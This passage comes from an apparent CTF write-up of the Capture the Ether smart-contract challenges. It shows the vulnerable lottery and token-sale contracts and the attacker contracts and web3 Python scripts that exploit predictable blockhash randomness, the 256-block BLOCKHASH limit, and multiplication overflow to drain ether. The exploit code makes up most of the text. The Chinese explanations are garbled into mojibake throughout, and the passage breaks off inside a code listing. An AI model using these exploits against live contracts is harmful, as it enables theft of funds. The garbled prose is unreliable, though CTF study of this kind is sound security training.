ã€‚é€šè¿‡æŸ¥é˜…ç›¸å…³èµ„æ–™æˆ‘ä»¬å‘ç°ï¼š</p><blockquote><p><strong>block.blockhash(block.number-1)</strong></p><p>æœ‰ä¸€äº›åˆçº¦åˆ™åŸºäºè´Ÿä¸€é«˜åº¦åŒºå—åŒºå—å“ˆå¸Œæ¥äº§ç”Ÿä¼ªéšæœºæ•°ï¼Œè¿™ä¹Ÿæ˜¯æœ‰ç¼ºé™·çš„ã€‚æ”»å‡»åˆçº¦åªè¦ä»¥ç›¸åŒä»£ç æ‰§è¡Œï¼Œå³å¯ä»¥äº§ç”Ÿåˆ°åŒæ ·çš„ä¼ªéšæœºæ•°ã€‚</p><p>ç¤ºä¾‹ï¼š&lt;Â <a href="https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8">https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8</a>&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Generate random number between 0 &amp; maxuint256 constant private FACTOR &#x3D; Â 1157920892373161954235709850086879078532699846656405640394575840079131296399;function rand(uint max) constant private returns (uint256 result)&#123;Â Â uint256 factor &#x3D; FACTOR * 100 &#x2F; max;Â Â uint256 lastBlockNumber &#x3D; block.number - 1;Â Â uint256 hashVal &#x3D; uint256(block.blockhash(lastBlockNumber));Â Â return uint256((uint256(hashVal) &#x2F; factor)) % max;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦å†™ä¸€ä¸ªä¸­ç»§åˆçº¦ï¼Œé€šè¿‡ä¸­ç»§åˆçº¦è°ƒç”¨ç›®æ ‡åˆçº¦çš„ç›¸å…³å‡½æ•°ï¼Œå³å¯ã€‚ä¸­ç»§åˆçº¦éœ€è¦ç”¨åˆ° <a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces">Interfaces)</a>  åˆ©ç”¨ä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface GuessTheNewNumberSolve &#123;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberSolver &#123;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function GuessTheNewNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve(address _challengeAddress) public payable &#123;</span><br><span class="line"></span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        GuessTheNewNumberSolve challenge &#x3D; GuessTheNewNumberSolve(_challengeAddress);</span><br><span class="line">        challenge.guess.value(msg.value)(answer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ remix ä¸­éƒ¨ç½²è¯¥åˆçº¦ä»£ç ï¼Œ å¹¶è°ƒç”¨ <code>solve</code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png"></a></p><p><strong>å‚è€ƒèµ„æ–™</strong><br><a href="https://www.freebuf.com/vuls/179173.html">ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­éšæœºæ•°é¢„æµ‹ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34">Letâ€™s Play â€” Capture the Ether : Lotteries (Part II) </a></p><h3 id="5-Predict-the-future"><a href="#5-Predict-the-future" class="headerlink" title="5.  Predict the future"></a>5.  Predict the future</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.</p><p>Note that it is indeed possible to solve this challenge without losing any ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; n;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£é¢˜ï¼š</strong></p><p>ï¼Œ é¢˜ç›®è¦æ±‚å…ˆé€šè¿‡ <code>lockInGuess</code> ä¸‹æ³¨ï¼Œ ç„¶åè°ƒç”¨ <code>settle</code> å¼€å¥–ã€‚ ç”±äº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†ä»£ç çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡é¢„æµ‹æ¥è§£å†³è¿™ä¸ªé¢˜ç›®ã€‚ ä½†æ˜¯ç”±äº <code>answer</code> èŒƒå›´ä¸º 0 - 9ï¼Œ æˆ‘ä»¬å¯ä»¥å…ˆ lock ä¸€ä¸ªå€¼ï¼Œ ç„¶åå½“è§‰å¾—æ—¶æœºåˆé€‚çš„ï¼Œå³ <code>answer == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</code>  çš„æ—¶å€™ï¼Œæˆ‘ä»¬å†è°ƒç”¨ <code>settle</code> ã€‚</p><ol><li>é¦–å…ˆç¼–å†™ä¸€ä¸ªä¸­ç»§åˆçº¦ï¼Œ åˆçº¦å†…å®¹è¦èƒ½è°ƒç”¨ challenge çš„ lock ä»¥åŠ<code>settle</code>ï¼Œ åœ¨åˆçº¦ä¸­è°ƒç”¨ settle å‰è¦åˆ¤æ–­ä¸‹æ˜¯å¦æ—¶æœºç¬¦åˆ</li><li>ç¼–å†™ä¸€ä¸ª web3 è„šæœ¬ï¼Œ æ¥è°ƒç”¨ä¸­ç»§åˆçº¦çš„åˆ¤æ–­å‡½æ•°ï¼Œ å½“ challenge çš„ <code>isComplete</code> å·²ç»è¢«è°ƒç”¨åï¼Œ å°±é€€å‡ºè„šæœ¬</li></ol><p>PS: ç¼–å†™ web3 python3 è„šæœ¬æ‰€éœ€è¦çš„ API JSON å¯åœ¨ Remix ä¸­å¯¼å‡ºã€‚</p><p><strong>codeï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IGuessTheNewNumberChallenge &#123;</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberSolver &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(address _addr, uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">        </span><br><span class="line">        challenge.lockInGuess.value(msg.value)(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle(address _addr, uint8 n ) public payable &#123;</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        if (answer &#x3D;&#x3D; n )&#123;</span><br><span class="line">            IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">            challenge.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-Predict-the-block-hash"><a href="#6-Predict-the-block-hash" class="headerlink" title="6.   Predict the block hash"></a>6.   Predict the block hash</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; hash;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer &#x3D; block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=VbTrdj7vPGU">Get Lucky</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>æ ¹æ®é»„çš®ä¹¦å¯¹ <code>BLOCKHASH </code> çš„å®šä¹‰ï¼šåªèƒ½è·å–æœ€è¿‘ 256 ä¸ªåŒºå—çš„å“ˆå¸Œï¼Œè¶…å‡ºæ—¶è¿”å› 0</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆçŒœ 0 çš„ hashï¼Œ ç„¶åç­‰ä»–è¶…è¿‡ 256 ä¸ªåŒºå—ï¼Œå†æ¥å¼€å¥–ã€‚ å¯ä»¥ç”¨ python3 web3ç›´æ¥å®ç°åˆ©ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;settle&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;hash&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bytes32&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;lockInGuess&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key) </span><br><span class="line"></span><br><span class="line">my_guess_hash = <span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"></span><br><span class="line">print(w3.eth.getTransactionCount(acct.address))</span><br><span class="line"></span><br><span class="line">print(contract.all_functions())</span><br><span class="line"></span><br><span class="line">tx = contract.functions.lockInGuess(my_guess_hash).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>:  Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&quot;gas&quot;</span>: <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gasPrice,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">            <span class="string">&quot;chainId&quot;</span>: <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line"></span><br><span class="line">print(w3.eth.wait_for_transaction_receipt(tx_id, timeout=  <span class="number">300</span> ))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="1-Token-sale"><a href="#1-Token-sale" class="headerlink" title="1. Token sale"></a>1. Token sale</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.</p><p>The contract starts off with a balance of 1 ether. See if you can take some of that away.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN &#x3D; 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] +&#x3D; numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=tgIqecROs5M"><del>Sale</del>Â Sail</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p><code>buy</code> å‡½æ•°ä¸­çš„ä¹˜æ³•å­˜åœ¨æº¢å‡ºï¼Œ å› æ­¤æˆ‘ä»¬å¯ä»¥ä½ä¹°é«˜å– ã€‚ æ­¤å¤„çš„msg.valueæ˜¯ä»¥etherä¸ºå•ä½ï¼Œå› ä¸ºä¸€ä¸ªPRICE_PRE_TOKENå°±æ˜¯1 etherï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ˜ç™½åœ¨ä»¥å¤ªåŠé‡Œæœ€å°çš„å•ä½æ˜¯weiï¼Œæ‰€ä»¥æ­¤å¤„çš„1 etheräº‹å®ä¸Šä¹Ÿå°±æ˜¯10^18 weiï¼Œå³å…¶å€¼çš„å¤§å°ä¸º10^18 weiï¼Œè¿™æ ·å°±æ»¡è¶³æˆ‘ä»¬æº¢å‡ºçš„æ¡ä»¶äº†ï¼Œå› ä¸ºä»¥å¤ªåŠå¤„ç†æ•°æ®æ˜¯ä»¥256ä½ä¸ºå•ä½ï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªè¾ƒå¤§çš„numTokensï¼Œä¹˜æ³•è¿ç®—æº¢å‡ºåæ‰€éœ€çš„mag.valueå°±éå¸¸å°äº†ï¼Œ ç›´æ¥åˆ©ç”¨ Python è„šæœ¬è§£å†³è¿™ä¸ªé¢˜ç›®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 